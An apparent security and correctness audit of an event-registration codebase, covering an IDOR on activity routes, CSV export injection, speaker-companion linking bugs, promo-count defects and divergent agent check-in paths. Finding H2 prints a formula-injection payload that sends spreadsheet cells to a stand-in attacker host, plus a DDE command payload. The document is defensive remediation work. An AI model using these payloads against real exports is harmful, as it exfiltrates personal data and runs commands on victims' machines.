Code Review — Registrations & Speakers

Production-readiness audit · 10 July 2026 · EA-SYS main @ 598839b
Four independent review passes: registration lifecycle · speakers & companion registrations · RBAC / security · duplication & failure-visibility.

How to read this. Findings are grouped by theme, not by which agent found them, because the same root causes surfaced from several angles. Each carries a severity, the exact code, and a concrete failure scenario — no finding is here unless it was verified in source. Everything already tracked in docs/ROADMAP.md was deliberately excluded so this document is net-new.

1. Executive summary

The core of both domains is well built. The seat model (planSeatTransition / claimSeat / releaseSeat) is a pure, unit-tested design with correct atomic guards; the refund arc (credit-note gate → optimistic lock → cumulative Stripe idempotency keys → refund-before-cancel) shows real care that money is never left in limbo; the services layer's errors-as-values convention makes failure paths explicit; and the ONSITE per-event isolation fix is genuinely applied to all five desk routes.

The risk is concentrated at the seams between callers, not inside any one path. Three structural patterns explain almost every finding below:

  1. Fixes land on one copy of a mirrored path. After an extraction (the seat applier), the orchestration shells around it stayed duplicated REST↔MCP — and subsequent fixes (the sponsor gate, the payment-gated check-in, the tag sync) were applied to the REST copy only. The agent/n8n path now enforces a different business policy than the dashboard.
  2. Bulk and override paths skip the invariants the single path enforces. bulk-type, create_registrations_bulk, create_speakers_bulk, CSV import, and check_in_registration(allowCancelled) each bypass at least one guard the single-row path treats as mandatory.
  3. The speaker↔registration facet link is one-directional. Speaker-side changes cascade to the companion; registration-side changes do not cascade back.

2. Security & tenancy

High  H1 — Cross-tenant IDOR on both /activity routes

src/app/api/events/[eventId]/registrations/[registrationId]/activity/route.ts:26-42
src/app/api/events/[eventId]/speakers/[speakerId]/activity/route.ts:28-45

Both routes hand-roll their event lookup instead of using buildEventAccessWhere, and neither calls denyReviewer: 

const event = await db.event.findFirst({
  where: {
    id: eventId,
    ...(session.user.organizationId ? { organizationId: session.user.organizationId } : {}),
  },
  select: { id: true },
});

Why it breaks

REGISTRANT, SUBMITTER and REVIEWER all have organizationId === null by design (they're org-independent). For those roles the spread collapses to {}, so the where becomes { id: eventId } — no organization filter at all. API routes bypass proxy.ts middleware, so these roles reach the handler directly.

Failure scenario

Anyone can self-create a REGISTRANT account through public registration. Authenticated as that account, call GET /api/events/{otherOrgEventId}/speakers/{speakerId}/activity. The event resolves (no org filter), the speaker resolves by {id, eventId}, and the response returns another organization's speaker audit trail (who-edited-what field diffs), full email-send history including recipient addresses and subjects, and certificate issuances. canViewFinance redacts money keys only — names, emails and the audit timeline are returned. IDs aren't trivially guessable, but they leak through public agenda and session APIs.

Fix

Route the event lookup through buildEventAccessWhere(session.user, eventId) and add denyReviewer(session) — the same shape every neighbouring route already uses.

High  H2 — CSV formula injection in every export

src/app/(dashboard)/events/[eventId]/registrations/page.tsx:233-238 · src/app/api/contacts/export/route.ts:5-8 · speakers export · invoices export 

row.map((cell) => `"${String(cell).replace(/"/g, '""')}"`).join(",")

Why it breaks

Quote-doubling is correct CSV escaping but does nothing about formula interpretation. Excel, Google Sheets and LibreOffice evaluate any cell whose first character is =, +, -, @, tab or CR — the surrounding quotes are CSV delimiters, not cell content. A repo-wide grep found no formula-neutralisation helper anywhere.

Failure scenario

Exported columns include firstName, lastName, organization, jobTitle, bio, city, tags — all attacker-controlled through public registration, which imposes no character restrictions. A registrant sets their first name to =HYPERLINK("https://evil.tld/?"&C2&D2,"click"). When an organizer opens registrations-<id>.csv, the formula runs in their trusted desktop context and can exfiltrate the adjacent email/phone cells. A =cmd|'/c calc'!A1 DDE payload is the same class.

Fix

One shared escapeCsvCell() that prefixes a leading ' when the first character is dangerous, used by every export path (registrations, speakers, contacts, invoices, attendance).

Medium  M1 — MCP registration writes scope by org, not by the tool's eventId

src/lib/agent/tools/registrations.ts:419, 853-857, 954-957

where: { id: { in: registrationIds }, event: { organizationId: ctx.organizationId } }  // ← not ctx.eventId

The MCP tool is invoked bound to one eventId, but the mutation filters on org only. An agent workflow scoped to Event A can cancel / reactivate / re-status registrations belonging to Event B in the same org. Not a privilege escalation (MCP keys are admin-equivalent), but a mis-scoped or hallucinated agent call silently mutates a sibling event. The REST PUT correctly scopes { id: registrationId, eventId }.

Low  L1 — Speakers list returns full faculty PII to submitters

src/app/api/events/[eventId]/speakers/route.ts:69-131

Event access is correctly assignment-gated (a SUBMITTER only resolves events where they have a linked Speaker), so there is no cross-tenant leak. But once resolved, the response carries every speaker's email, phone, bio, additionalEmail and social links. An abstracts-only submitter can enumerate the full faculty contact roster of their own event. Consider a reduced projection for the session-auth branch.

3. Speaker ↔ registration facets

A speaker who attends gets a companion Registration on the hidden isFaculty ticket type — that companion is what gives them a badge, entry barcode, DTCM barcode, check-in and survey. The link is Speaker.sourceRegistrationId. These findings are all about that link being one-directional or pointing at the wrong row.

High  H3 — Companion link can bind to a CANCELLED registration, permanently

src/lib/speaker-companion.ts:100-118

const existing = await db.registration.findFirst({
  where: { eventId: speaker.eventId, attendee: { email: speaker.email } },  // no status filter
  select: { id: true },
  orderBy: { createdAt: "asc" },                                            // oldest first
});
if (existing) { /* link it as the companion */ }

Failure scenario

A delegate registers, cancels, and is later added as faculty. The email match finds the cancelled row — and orderBy: createdAt asc makes picking a stale row more likely when the person also has an active newer registration. The link is then permanent: the if (speaker.sourceRegistrationId) return "already-linked" short-circuit means no Faculty companion is ever created and the backfill script no-ops.

The speaker now holds a companion that check-in hard-rejects ("Cannot check in a cancelled registration"). Nothing surfaces it until the confirmed speaker is turned away at the door with a dead barcode.

Fix

Exclude CANCELLED from the email-match (prefer an active row; fall back to creating a fresh companion).

High  H4 — Registration email change does not cascade to the Speaker facet

src/app/api/events/[eventId]/registrations/[registrationId]/email/route.ts (PATCH)

The speaker-side PATCH does sync its companion. The registration-side PATCH updates only Attendee → User → Contact. The asymmetry matters because faculty companion rows are visible in the registrations list (operational surfaces deliberately keep faculty).

Failure scenario

An organizer fixes a typo'd email on a faculty row in the registrations list. Then:

  1. Speaker.email keeps the dead address, so invitations and agreements keep going there.
  2. repointOrgContactEmail moves the org Contact to the new address; the next speaker PUT calls syncToContact({ email: speaker.email /* old */ }) and re-creates a stale Contact at the old address.
  3. Adding "the same person" as a speaker at the corrected email passes the @@unique([eventId, email]) check → duplicate Speaker + a second Faculty companion.

Fix

Detect createdSource === "SPEAKER_COMPANION" (or the sourceRegistrationId back-pointer) and cascade to Speaker.email inside the same transaction — mirroring the speaker-side PATCH.

High  H5 — MCP tag writes bypass person-tag-sync entirely

src/lib/agent/tools/speakers.ts:246-250 · src/lib/agent/tools/registrations.ts:584-585

The July tag-sync (commit a307d9b, "sync tags between a person's Registration and Speaker facets") is imported by exactly four REST routes. It never reached the MCP executors, which write tags raw: 

if (Array.isArray(input.tags)) {
  updates.tags = (input.tags as unknown[])
    .map((t) => normalizeTag(String(t).slice(0, 100)))
    .filter(Boolean);
}

Why it matters right now

Tags are the routing key for certificates, badge cohorts and email segments — and the n8n/agent path is a live consumer (the Webflow committee sync). Tagging committee speakers via MCP update_speaker updates Speaker.tags only, so the companion Attendee.tags stays stale. Consequently: the survey-gated ATTENDANCE certificate auto-issue silently issues nothing (it routes on attendee tags), the bulk-email tagsInclude filter excludes them, and GET /registrations?tags=committee misses them. The reverse hole exists in update_registration.

Medium  M2 — ensureSpeakerCompanionRegistration is check-then-create with no uniqueness backstop

src/lib/speaker-companion.ts:100-124, 171-174

Two concurrent calls (double-submitted /submitter POST; a speaker-add racing a public registration for the same email) both see no existing registration, both create an attendee + a CONFIRMED registration with a minted qrCode, and the second speaker.update overwrites the pointer. The loser is an orphaned CONFIRMED Faculty registration holding a valid entry barcode — scannable at check-in, printed in bulk-badge runs, and invisible to the speaker DELETE cleanup (which follows sourceRegistrationId only). A duplicate faculty ticket type is harmless, as the code comments note; a duplicate registration is a ghost physical-access credential. A partial unique index or an advisory lock keyed on (eventId, email) closes it.

Medium  M3 — Deleting a companion registration silently strips the speaker's attendee facet

prisma/schema.prisma:1056 (onDelete: SetNull) · registration DELETE handler

The DELETE handler has no createdSource === "SPEAKER_COMPANION" check. An operator tidying the registrations list ("why is there a comp registration for someone who never registered?") deletes it; sourceRegistrationId SetNulls; the speaker stays CONFIRMED but now has no badge / barcode / check-in / survey / certificate facet, and nothing re-runs the ensure. Recovery is a manual run of scripts/backfill-speaker-companion-registrations.ts. At minimum, warn on companion rows and log the detach so it's discoverable.

Low  L2 — Speaker DELETE cleans up the companion outside the transaction

src/app/api/events/[eventId]/speakers/[speakerId]/route.ts:393-421

The speaker is deleted first; the companion delete follows in a separate, failure-isolated block. If that transaction fails (the P2024 pool-timeout class this box has already hit), the speaker is gone but a CONFIRMED Faculty registration with a valid barcode survives — check-in-able, with nobody behind it, and only an error-log line as evidence. Failure isolation is the right contract for create, not for delete. Wrap the pair in one transaction, or delete the companion first.

4. Money, seats & promo codes

Dormancy caveat. soldCount counters are not currently enforced (events are uncapped), so pure seat-counter bugs have near-zero live impact today. They become real the moment capacity limits or multi-tenancy land. Promo usedCount and price fields are live now.

High  H6 — Promo usedCount release is one-way and unguarded; it can go negative

src/lib/registration-seat-db.ts:105-108

const becomingCancelled = input.next.status === "CANCELLED" && input.prev.status !== "CANCELLED";
if (becomingCancelled && input.promoCodeId) {
  await tx.promoCode.update({ where: { id: input.promoCodeId }, data: { usedCount: { decrement: 1 } } });
}

Three defects in four lines:

  • No re-increment on reactivation. CANCELLED → CONFIRMED re-claims the seat but not the promo.
  • Registration.promoCodeId, discountAmount and the PromoCodeRedemption row all survive the cancel.
  • No usedCount: { gt: 0 } guard — unlike promo-code-service.releaseExistingRedemption, which the same codebase treats as the correct pattern.

Failure scenarios

  1. Registration with a promo (usedCount = 1) → cancel (→ 0) → REST PUT reactivate to CONFIRMED (stays 0; the registration keeps its discount) → cancel again (→ −1). A maxUses-capped code now admits extra redemptions.
  2. Cancel a promo'd UNPAID registration (applier decrements), then hit DELETE /promo on it — its paymentStatus is still UNPAID so the OUTSTANDING gate passes — and releaseExistingRedemption decrements again. Two releases, one redemption.

High  H7 — Registration PUT commits attendee edits before the optimistic-lock check

src/app/api/events/[eventId]/registrations/[registrationId]/route.ts:425-499

if (attendee) {
  await db.attendee.update({ where: { id: existingRegistration.attendeeId }, ... });   // ← outside the tx
  ...
  await syncToContact({ ... });                                                        // ← outside the tx
}
...
const registration = await db.$transaction(async (tx) => {
  ... updateMany({ where: { id, ...(expectedUpdatedAt && { updatedAt: ... }) } })     // ← the lock lives here
});

Failure scenario

Two admins open the same registration. B saves name / tag / dietary edits together with a status change. A saved first, so B gets 409 STALE_WRITE — "reload the latest version and try again" — but B's attendee fields, the Contact-store sync and the speaker-tag mirror have already persisted. Two editors' data silently interleaves while the UI reports nothing was saved. The same partial write happens when the transaction later throws CAPACITY_EXCEEDED.

Drift note: the MCP update_registration executor does the attendee update inside the transaction, after the lock check. The two paths disagree on atomicity.

High  H8 — Bulk type change never re-stamps originalPrice and bypasses every repricing guard

src/app/api/events/[eventId]/registrations/bulk-type/route.ts:133-136

await tx.registration.updateMany({
  where: { id: { in: registrations.map((r) => r.id) } },
  data: { ticketTypeId, pricingTierId: null },     // no originalPrice, no guards
});

Failure scenario

readRegistrationBasePrice prefers the stamped originalPrice over the ticket type's price, and the single-row paths re-stamp it via resolveRepricing on every type change. Bulk-type doesn't. So an unpaid registration on "Student" ($100, originalPrice = 100) bulk-moved to "Physician" ($400) keeps resolving $100 in the detail sheet, the quote PDF, the pay-later checkout, and refundRegistration's paidTotal. The registrant pays $100 for a $400 category and every finance surface agrees with the wrong number.

Bulk-type also skips both single-path guards: it will move PAID registrations (single path blocks with TIER_CHANGE_REQUIRES_UNPAID) and registrations with a promo applied (single path blocks with TIER_CHANGE_HAS_DISCOUNT, because the stored discountAmount was computed against the old price).

High  H9 — Check-in exists three times with divergent gates; the MCP copy skips the payment gate and the audit log

src/lib/agent/tools/registrations.ts:330-365 vs check-in/route.ts:15-128 and :131-260

REST (both handlers):

if (registration.status === "CANCELLED") return ...400;
if (!isComplimentary && (paymentStatus === "UNPAID" || paymentStatus === "PENDING"))
  return { error: "Cannot check in — payment required" }, 400;
...
await db.auditLog.create({ ... action: "CHECK_IN" ... });

MCP check_in_registration:

if (reg.status === "CANCELLED" && !allowCancelled) return {...};   // the only gate
await db.registration.update({ data: { checkedInAt: new Date(), status: "CHECKED_IN" } });
// no payment gate · no audit log · no seat/promo transition

Three concrete divergences

  1. An agent-driven "check everyone in" admits UNPAID / PENDING attendees the desk would refuse — a revenue-gate bypass at a live event.
  2. MCP check-ins leave no AuditLog row, so the door trail is incomplete.
  3. allowCancelled: true flips CANCELLED → CHECKED_IN via a raw update, outside applyRegistrationTransition. The cancel released the seat and the promo usedCount; this reactivation re-claims neither. Seat counters are dormant, but the promo under-count is live — and a subsequent cancel releases usedCount a second time, feeding H6's negative-counter path.

The two REST handlers are themselves ~120 near-identical lines, with the isComplimentary computation copy-pasted. Check-in wants a single home.

Medium  M4 — Refund routes the whole balance through the newest payment only (✅ resolved — stale finding, verified July 11: the payments round's 1191b25 multi-payment allocation already slices refunds across ALL settled payments, each Stripe slice capped at its charge's own remaining via Payment.refundedAmount, manual remainder recorded. This finding and the payments-review H6 described the same defect; the fix landed under H6.)

src/services/payment-service.ts:237-238, 248-249

const payment = registration.payments[0];             // newest PAID payment only
const isManualRefund = !payment?.stripePaymentId;
...
const paidTotal = registration.payments.reduce((s, p) => s + Number(p.amount), 0);   // ALL payments

paidTotal (and thus the default full-refund amount) sums all PAID payments — the exact multi-payment shape the July-7 H2 fix acknowledged as real — but the execution branch looks only at payments[0]. Two failure directions:

  • Stripe $200 + later manual bank capture $300 (manual is newest) → isManualRefund = true; the $500 "refund" is merely recorded. The Stripe $200 is never reversed and the organizer is told to return everything out-of-band.
  • Reverse order → stripe.refunds.create({ payment_intent, amount: 500 }) against a $300 intent → Stripe rejects → STRIPE_FAILED, rollback. The registration becomes unrefundable through the app, and cancelRegistration({refund:true}) aborts every time.

Medium  M5 — Seat/promo deltas are computed from snapshots read outside the transaction that applies them

src/services/payment-service.ts:421 → 484-488 · agent/tools/registrations.ts:852 → 899 · bulk-type/route.ts:71 → 111

In cancelRegistration the gap between the snapshot read and the transaction contains the Stripe refund network call — seconds. If another admin flips the registration in-person → virtual during that window (releasing its seat), the cancel then commits and applyRegistrationTransition releases from the stale prev again. The claim-first updateMany defends against a concurrent cancel, not a concurrent mode/type change. Distinct from the ROADMAP's L3 (which is about callers omitting expectedUpdatedAt); this holds even when every caller sends it. Fix: re-read the row inside the transaction and compute prev from that.

Medium  M6 — CSV import claims a seat even for rows imported as CANCELLED

src/app/api/events/[eventId]/import/registrations/route.ts:328-336, 356

The soldCount increment runs before and regardless of the per-row status, but a CANCELLED row fails holdsSeat() — so nothing will ever release that seat (both DELETE and cancel gate release on holdsSeat). Importing 50 historical CANCELLED rows inflates the type's soldCount by 50 permanently; the type phantom-sells-out once capacity enforcement goes live.

Low  L3 — cancelRegistration lost-race returns success and writes a misleading audit row (✅ fixed July 16, a461420e: the cancel tx returns a claimed flag — the loser warn-logs cancel:lost-race and returns ok without the audit row)

src/services/payment-service.ts:475-506

The early return on a lost claim (claim.count === 0) is inside the transaction callback; the function then proceeds to write a REGISTRATION_CANCELLED audit row attributed to this caller, log "Registration cancelled", and return ok: true — with no log that the claim was lost. The audit trail shows two actors both cancelling. A claimed flag plus a warn log closes it.

5. Cross-caller drift

The seat + promo transition core is genuinely centralized — applyRegistrationTransition is called by the REST PUT, MCP update_registration and payment-service.cancelRegistration alike. What remains duplicated is the ~230-line orchestration shell around it (sponsor invariant, billing-account lookup, ticket-type scope check, changeData assembly, qrCode mint, audit/sync/stats fan-out), and that shell has already drifted again after the extraction.

#SevDriftConsequence
M7Med Sponsor gate fixed on REST only. The July-7 H2 change-scoped the INCLUSIVE_REQUIRES_SPONSOR / SPONSOR_NOT_FOUND checks to requests that actually touch those fields. MCP still checks unconditionally, under a comment that says "Same rules as the REST PUT route". An agent fixing a phone number on a legacy INCLUSIVE-without-sponsor registration is rejected outright, while the same edit succeeds in the dashboard.
M8Med create_registrations_bulk drift (4 behaviours): no paymentStatus default (falls to schema UNPAID even for $0 tickets); dup check omits the CANCELLED exclusion; requiresApproval ignored; no sales-window check and no confirmation email. "Bulk-import these 40 comp guests" via the agent produces 40 UNPAID rows that the Chase-Unpaid tile then emails a payment demand to. A cancelled attendee can never be re-added via bulk.
M9Med create_speakers_bulk skips syncToContact and drops role, country, city, state, zipCode, photo, additionalEmail, tags. The registrations twin does sync, under a comment naming this exact bug class. The speakers CSV import also skips it. A 100-row agent import never reaches the org Contact store; companions get null country (blank badge line) and null registrationType — re-creating the "unknown-profession faculty" class the July backfill just cleaned up.
M10Med bulk_update_registration_status is a fourth hand-written copy of the cancel/reactivate policy (~90 lines), with two near-identical 20-line claim blocks for tier vs ticketType. Any future capacity-semantics change needs four edits. Tracked as ROADMAP #6; status unchanged.
M11Med Create-time seat claim hand-rolled in three more places instead of claimSeat: registration-service.ts:626, MCP bulk create, public register (both tier and ticketType branches). Functionally equivalent today; four edit sites for one semantic.
L4Low Empty-string normalization drifts. REST + services collapse "" → null; MCP updates persist "". Contact-sync skips "", so the Contact keeps the old value while the entity row shows blank; downstream truthiness checks behave differently depending on which entry point last wrote.
The pattern to internalise. Extractions hold. But fixes applied after an extraction keep landing on only one copy of the still-mirrored shell — the sponsor gate, the payment-gated check-in, and the tag sync are three independent instances of the same decay. That is the strongest argument for finishing the registration-service.updateRegistration() extraction (ROADMAP #5) and giving check-in a single home.

6. Failure visibility

Medium  M12 — REST boundaries return service rejections as 4xx without logging (✅ fixed July 16, f985a747: registrations POST + speakers POST log every service rejection at warn — UNKNOWN at error — and the public register route logs the tier/sales-window/sold-out 400s plus the sentinel-mapped business rejections, incl. all four promo codes, at warn with the event slug)

registrations/route.ts:351-357 · speakers/route.ts:186-192 · public/register/route.ts:241-267

if (!result.ok) {
  const status = HTTP_STATUS_FOR_REGISTRATION_ERROR[result.code] ?? 500;
  return NextResponse.json({ error: result.message, code: result.code }, { status });   // no log
}

The service logs only UNKNOWN / transaction failures. SOLD_OUT, ALREADY_REGISTERED, SALES_ENDED, SALES_NOT_STARTED, TICKET_TYPE_NOT_FOUND, PRICING_TIER_NOT_FOUND, INVALID_PAYMENT_STATUS, INCLUSIVE_REQUIRES_SPONSOR, SPONSOR_NOT_FOUND and both BILLING_ACCOUNT_* codes return unlogged end-to-end, violating convention #10 verbatim. The MCP path is covered centrally by the runTool wrapper — only REST is dark. On the public revenue path, register/route.ts returns "Pricing tier not found", "sales have not started" and "Sold out" with zero logging, while the memberId/studentId 400s ten lines below all warn-log. Desk staff reporting "it says sold out" during a live sales window leaves nothing in /logs to correlate.

Medium  M13 — Awaited audit writes turn insert blips into 500s on already-committed operations (✅ fixed July 16, f985a747: registration DELETE, speaker DELETE and the speaker single-send EMAIL_SENT audit writes are fire-and-forget with a logged catch; the check-in pair + both PUTs were already covered by the July 10–13 rounds)

[registrationId]/route.ts:690, 945 · check-in/route.ts:94, 225 · speakers/[speakerId]/route.ts:318

Every service and MCP tool treats the audit write as fire-and-forget with a logged .catch. These five REST sites bare-await it inside the try. A transient audit failure — the P2024 pool-timeout class this box has already hit — after the registration update / delete / check-in has committed propagates to the outer catch and returns 500 "Failed to check in".

At the door: check-in commits, the audit insert times out, the desk sees a failure, re-scans, gets 400 "Already checked in", and the operator concludes the scanner is broken mid-event. The DELETE route's own DELETE_BLOCKED branch already does this correctly, three screens above the unprotected one.
